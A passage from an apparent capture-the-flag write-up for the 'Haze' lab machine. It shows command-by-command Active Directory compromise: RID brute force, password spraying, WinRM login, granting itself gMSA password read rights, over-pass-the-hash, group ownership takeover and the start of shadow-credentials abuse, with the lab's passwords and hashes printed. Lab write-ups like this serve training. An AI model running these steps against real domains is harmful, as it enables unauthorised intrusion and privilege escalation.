INFO: Uploading file 20250707074546_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.
```


##### Statistics

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ HAZE.HTB           │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │       3 │       2 │
│ Computer Accounts  │       1 │       1 │
│ Domain Admins      │       0 │       0 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       0 │       0 │
│ Groups             │      38 │         │
│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘
```


##### Users with description

- `PAUL.TAYLOR` has limited rights to the domain since it can't read info of default users such as `Administrator`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bhcli users -d "$(pt get domain)" --description
HAZE-IT-BACKUP$@HAZE.HTB
NT AUTHORITY@HAZE.HTB
PAUL.TAYLOR@HAZE.HTB
```


##### Audit

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bhcli audit -d "$(pt get domain)"
HAZE.HTB
========

[*] Interesting privileges for domain users or computers
    0 relations found

[*] Interesting privileges for guests
    0 relations found

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found
```


#### Ldeep

```bash
mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s "ldap://$(pt get rhost)" all ldeep/
```


##### Insight

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 2105300 Jul  7 07:49 ldeep/_schema.lst
-rw-r--r-- 1 bravosec kali    3023 Jul  7 07:49 ldeep/_server_info.lst
-rw-r--r-- 1 bravosec kali    1819 Jul  7 07:48 ldeep/_dns_records.lst
-rw-r--r-- 1 bravosec kali     721 Jul  7 07:48 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali     631 Jul  7 07:48 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali     329 Jul  7 07:48 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali     195 Jul  7 07:48 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali     179 Jul  7 07:48 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali     136 Jul  7 07:48 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali      66 Jul  7 07:48 ldeep/_gmsa.lst
-rw-r--r-- 1 bravosec kali      41 Jul  7 07:49 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali      38 Jul  7 07:48 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali      22 Jul  7 07:48 ldeep/_machines.lst
-rw-r--r-- 1 bravosec kali      21 Jul  7 07:48 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali      21 Jul  7 07:48 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali      12 Jul  7 07:49 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali      12 Jul  7 07:49 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali      12 Jul  7 07:49 ldeep/_users_nopasswordexpire.lst
```


##### Users

```bash
[
  {
    "distinguishedName": "CN=Paul Taylor,OU=Restricted Users,DC=haze,DC=htb",
    "lastLogonTimestamp": "2025-07-06T23:35:41.519556+00:00",
    "sAMAccountName": "paul.taylor",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "userPrincipalName": "paul.taylor@haze.htb"
  }
]
```


##### Group users by group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb": [
    "paul.taylor"
  ]
}
```


### User access check


#### AD

![](/assets/obsidian/68cd420d5357494deb6bfabda1e3dc38.png)

#### SMB Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc smb $(pt get dc_fqdn) -k -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10 -k
SMB         DC01.haze.htb   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         DC01.haze.htb   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC01.haze.htb   445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS DC01.haze.htb   445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC01.haze.htb   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC01.haze.htb   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS DC01.haze.htb   445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         DC01.haze.htb   445    DC01             [*] Enumerated shares
SMB         DC01.haze.htb   445    DC01             Share           Permissions     Remark
SMB         DC01.haze.htb   445    DC01             -----           -----------     ------
SMB         DC01.haze.htb   445    DC01             ADMIN$                          Remote Admin
SMB         DC01.haze.htb   445    DC01             C$                              Default share
SMB         DC01.haze.htb   445    DC01             IPC$            READ            Remote IPC
SMB         DC01.haze.htb   445    DC01             NETLOGON        READ            Logon server share
SMB         DC01.haze.htb   445    DC01             SYSVOL          READ            Logon server share
SPIDER_PLUS DC01.haze.htb   445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/DC01.haze.htb.json".
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] Total folders found:  19
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] Total files found:    5
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] File size average:    1.52 KB
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] File size min:        22 B
SPIDER_PLUS DC01.haze.htb   445    DC01             [*] File size max:        3.76 KB
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat ~/".nxc/modules/nxc_spider_plus/$(pt get rhost).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
SYSVOL/haze.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-03-05 15:08:28  1.07 KB
SYSVOL/haze.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                           2025-03-05 15:12:09  22 B
SYSVOL/haze.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                              2025-03-05 15:12:09  2.72 KB
SYSVOL/haze.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                           2025-03-05 15:50:58  22 B
SYSVOL/haze.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-03-05 15:50:58  3.76 KB
```


### RID bruteforce

Since `paul.taylor` has limited access to the domain, we can perform RID brute force to retrieve users and groups

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --rid-brute -k | tee enum/nxc_rid_brute.log
SMB                      DC01.haze.htb   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB                      DC01.haze.htb   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
SMB                      DC01.haze.htb   445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             500: HAZE\Administrator (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             501: HAZE\Guest (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             502: HAZE\krbtgt (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             513: HAZE\Domain Users (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
SMB                      DC01.haze.htb   445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             525: HAZE\Protected Users (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             526: HAZE\Key Admins (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
SMB                      DC01.haze.htb   445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      DC01.haze.htb   445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      DC01.haze.htb   445    DC01             1000: HAZE\DC01$ (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
SMB                      DC01.haze.htb   445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             1104: HAZE\mark.adams (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             1105: HAZE\edward.martin (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             1106: HAZE\alexander.green (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
SMB                      DC01.haze.htb   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
SMB                      DC01.haze.htb   445    DC01             1112: HAZE\Support_Services (SidTypeGroup)
```

Extract usernames to a list

```bash
cat enum/nxc_rid_brute.log | grep SidTypeUser | awk -F'\' '{print $2}' | awk '{print $1}' > enum/users.lst
```


### 88 - Kerberos : Password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log --continue-on-success -u enum/users.lst -p "$(pt get pass)"
LDAP        DC01.haze.htb   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 KDC_ERR_PREAUTH_FAILED
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 KDC_ERR_CLIENT_REVOKED
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 KDC_ERR_CLIENT_REVOKED
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 KDC_ERR_PREAUTH_FAILED
LDAP        DC01.haze.htb   389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
LDAP        DC01.haze.htb   389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 KDC_ERR_PREAUTH_FAILED
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 KDC_ERR_PREAUTH_FAILED
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 KDC_ERR_PREAUTH_FAILED
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ creds-set 'mark.adams' 'Ld@p_Auth_Sp1unk@2k24'
[+] Password set for user mark.adams
```


### 5985 - winrm

We are in `Remote Management Users` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc winrm $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.61     5985   DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)
```

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250626.63631.6b8f623 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in mark.adams.ccache
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami
haze\mark.adams
```


## Auth as Haze-IT-Backup$


### Domain enumeration

- `mark.adams` has access to read more domain info

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 8 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 19S
INFO: Compressing output into 20250707082709_bloodhound.zip
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bhcli upload `ls -t *.zip | head -1`
INFO: Starting new file upload job...
INFO: Uploading file 20250707082709_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.
```

```bash
mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s "ldap://$(pt get rhost)" all ldeep/
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 2105300 Jul  7 08:27 ldeep/_schema.lst
-rw-r--r-- 1 bravosec kali    3023 Jul  7 08:27 ldeep/_server_info.lst
-rw-r--r-- 1 bravosec kali    1819 Jul  7 08:27 ldeep/_dns_records.lst
-rw-r--r-- 1 bravosec kali    1134 Jul  7 08:27 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali     721 Jul  7 08:27 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali     329 Jul  7 08:27 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali     195 Jul  7 08:27 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali     179 Jul  7 08:27 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali     136 Jul  7 08:27 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali      66 Jul  7 08:27 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali      59 Jul  7 08:27 ldeep/_users_nopasswordexpire.lst
-rw-r--r-- 1 bravosec kali      53 Jul  7 08:27 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali      45 Jul  7 08:27 ldeep/_gmsa.lst
-rw-r--r-- 1 bravosec kali      41 Jul  7 08:27 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali      38 Jul  7 08:27 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali      22 Jul  7 08:27 ldeep/_machines.lst
-rw-r--r-- 1 bravosec kali      21 Jul  7 08:27 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali      21 Jul  7 08:27 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali      13 Jul  7 08:27 ldeep/_users_disabled.lst
-rw-r--r-- 1 bravosec kali       6 Jul  7 08:27 ldeep/_users_passwordnotrequired.lst
```

- `mark.adams` is in `gMSA_Managers` group, which could have management access to **GMSA**
- `alexander.green` is in `Splunk_Admins` group, which could have admin access to Splunk -> RCE

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Splunk_Admins,CN=Users,DC=haze,DC=htb": [
    "alexander.green"
  ],
  "CN=gMSA_Managers,CN=Users,DC=haze,DC=htb": [
    "mark.adams"
  ],
  "CN=Remote Management Users,CN=Builtin,DC=haze,DC=htb": [
    "mark.adams"
  ],
  "CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb": [
    "paul.taylor"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=haze,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=haze,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=haze,DC=htb": [
    "Administrator"
  ],
  "CN=Domain Admins,CN=Users,DC=haze,DC=htb": [
    "Administrator"
  ],
  "CN=Enterprise Admins,CN=Users,DC=haze,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=haze,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=haze,DC=htb": [
    "Administrator"
  ]
}
```


### Local machine enumeration

`C:\Backups` is interesting

```bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> (ls -Force \) 2>$null | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                       LastWriteTime        Length     FullName
----   -----                       -------------        ------     --------
d-----                             5/8/2021 1:20:24 AM             C:\PerfLogs
d----- NT SERVICE\TrustedInstaller 5/8/2021 2:40:21 AM             C:\Program Files (x86)
d--hsl NT AUTHORITY\SYSTEM         3/4/2025 10:59:21 PM            C:\Documents and Settings
d--hs- BUILTIN\Administrators      3/4/2025 10:59:22 PM            C:\Recovery
d--hs- NT AUTHORITY\SYSTEM         3/4/2025 11:00:56 PM            C:\$Recycle.Bin
d--hs-                             3/4/2025 11:12:29 PM            C:\System Volume Information
d-r--- NT SERVICE\TrustedInstaller 3/4/2025 11:28:39 PM            C:\Program Files
d-----                             3/5/2025 12:32:58 AM            C:\Backups
d----- NT AUTHORITY\SYSTEM         3/25/2025 2:06:28 PM            C:\inetpub
d----- NT SERVICE\TrustedInstaller 3/25/2025 2:15:34 PM            C:\Windows
d--h-- BUILTIN\Administrators      3/25/2025 2:22:24 PM            C:\$WinREAgent
-a-hs-                             7/5/2025 3:38:15 PM  12288      C:\DumpStack.log.tmp
d-r--- NT AUTHORITY\SYSTEM         7/5/2025 5:05:52 PM             C:\Users
d--h-- NT AUTHORITY\SYSTEM         7/5/2025 5:40:03 PM             C:\ProgramData
-a-hs-                             7/6/2025 3:28:29 PM  1476395008 C:\pagefile.sys
```

However, we do not have permissions to view the folder

```bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> icacls C:\Backups
icacls.exe : C:\Backups: Access is denied.
    + CategoryInfo          : NotSpecified: (C:\Backups: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Successfully processed 0 files; Failed processing 1 files
```


### User access check


#### AD

- `mark.adams` has write access to **GMSA** password readers on `Haze-IT-Backup`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb
permission: WRITE

distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb
permission: WRITE

distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
permission: WRITE

┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get writable --detail
[...]
distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
msDS-GroupMSAMembership: WRITE
```

- **bloudhound** couldn't get the attack path from **Outbound Object Control** since **DACL** relationships such as write access to `msDS-GroupMSAMembership` isn't in its database

![](/assets/obsidian/3ec5b0ed510e9086e9a452d0088a4155.png)


### DACL Abuse - Read GMSA password

![](/assets/obsidian/17edbc15c83e542b48816ba80f56b7a6.png)

- `ms-DS-GroupMSAMembership` attribute on `Haze-IT-Backup$` has nothing set

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get object 'CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb' --attr 'msDS-GroupMSAMembership' --resolve-sd

distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
```

Generate a **SDDL** (Windows Security Descriptor Definition Language) string of an **allowed Read Property** (`RP`) **DACL ACE** for `mark.adams`

1. Get **SID** of `mark.adams`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get object "$(pt get user)" --attr 'objectSid'

distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb
objectSid: S-1-5-21-323145914-28650650-2368316563-1104
```

2. Generate SDDL string

- Google : `SDDL generator`

> https://thesddlmaker.streamlit.app/ ([Github REPO](https://github.com/MHaggis/SDDLMaker))

![](/assets/obsidian/a4c2e7b7c0035213ec370b050f4540b2.png)

![](/assets/obsidian/4268da7e344b0189d5e59192096c82cf.png)

![](/assets/obsidian/272589c77f30d7ee16d74bef4f9b584f.png)

Fix the **SDDL** string to fit DACL ACE's format

1. Remove the residual trustee `;;AO`
2. Add 2 `;` before the `Trustee` (`S-1-5-21-323145914-28650650-2368316563-1104`) entry

```
O:PSD:(A;;RP;;;S-1-5-21-323145914-28650650-2368316563-1104)
```

Change `ms-DS-GroupMSAMembership` attribute on `Haze-IT-Backup$` account

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" set object 'Haze-IT-Backup$' 'msDS-GroupMSAMembership' -v 'O:PSD:(A;;RP;;;S-1-5-21-323145914-28650650-2368316563-1104)'
[+] Haze-IT-Backup$'s msDS-GroupMSAMembership has been updated
```

> **Alternative method**
> 
> From powershell with default AD module
> 
> ```powershell
> Set-ADServiceAccount Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
> ```
{: .prompt-tip }

Now we can read **GMSA** password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d $(pt get domain) -s ldap://$(pt get domain) gmsa
Haze-IT-Backup$:nthash:723fd747a7523dbebfc5b1d3d759ffbf
Haze-IT-Backup$:aes128-cts-hmac-sha1-96:56dd4f3a2f9bf1b8721d26ae290b3ac0
Haze-IT-Backup$:aes256-cts-hmac-sha1-96:43c649f0cb567989f0ad1e040955fe74dcdc6b1a31baeceb63be0b077d975685
Haze-IT-Backup$:reader:mark.adams
```

Request a TGT via over-pass-the-hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ creds-set 'Haze-IT-Backup$' '43c649f0cb567989f0ad1e040955fe74dcdc6b1a31baeceb63be0b077d975685'
[+] Hash set for user Haze-IT-Backup$

┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ getTGT.py -dc-ip $(pt get ip) -aesKey "$(pt get hash)" "$(pt get domain)"/"$(pt get user)"; pt set ticket $(realpath "$(pt get user).ccache")
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250626.63631.6b8f623 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Haze-IT-Backup$.ccache
```


## Shell as edward.martin


### User access check


#### AD

- `Haze-IT-Backup$` can write owner of `SUPPORT_SERVICES` group

![](/assets/obsidian/8dd34d2cedcf30ec67d27fc62189803f.png)


### DACL Abuse - Write owner

Set `SUPPORT_SERVICES` group's owner to `Haze-IT-Backup$`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get hash)" -f aes -k set owner 'Support_Services' 'Haze-IT-Backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on Support_Services
```

Grant `Haze-IT-Backup$` **GenericALL** ACE on `Support_Services` in order to add itself to the group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get hash)" -f aes -k add genericAll 'Support_Services' 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ has now GenericAll on Support_Services
```

Add `Haze-IT-Backup$` to `Support_Services` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get hash)" -f aes -k add groupMember 'Support_Services' 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ added to Support_Services
```


### DACL Abuse - Shadow credentials

`Support_Services` group has write access to the `msDS-KeyCredentialLink` attribute on `CN=Edward Martin,CN=Users,DC=haze,DC=htb`, which means we can create shadow credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get hash)" -f aes -k get writable

distinguishedName: CN=TPM Devices,DC=haze,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb
permission: WRITE

distinguishedName: CN=Edward Martin,CN=Users,DC=haze,DC=htb
permission: WRITE
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get hash)" -f aes -k get writable --detail | grep 'distinguishedName: CN=Edward Martin' -A10
